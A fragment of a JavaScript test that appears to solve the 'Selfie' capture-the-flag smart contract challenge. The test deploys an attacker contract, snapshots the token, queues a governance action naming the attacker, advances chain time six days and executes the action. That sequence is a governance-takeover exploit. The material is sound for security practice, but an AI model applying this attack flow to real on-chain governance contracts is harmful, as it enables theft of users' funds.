...
describe('[Challenge] Selfie', function () {
    ...
    it('Exploit', async function () {
        ...
        console.log("1");
        const AttackerSelfieFactory = await ethers.getContractFactory('AttackerSelfie', deployer);
        console.log("2");
        this.attacker = await AttackerSelfieFactory.deploy(this.pool.address, this.token.address, this.governance.address);
        console.log("3");
        await this.attacker.takeSnapshot();
        await this.attacker.callQueueAction(attacker.address);
        
        await ethers.provider.send("evm_increaseTime", [6 * 24 * 60 * 60]); // 6 days

        await this.attacker.callExecuteAction();
    });
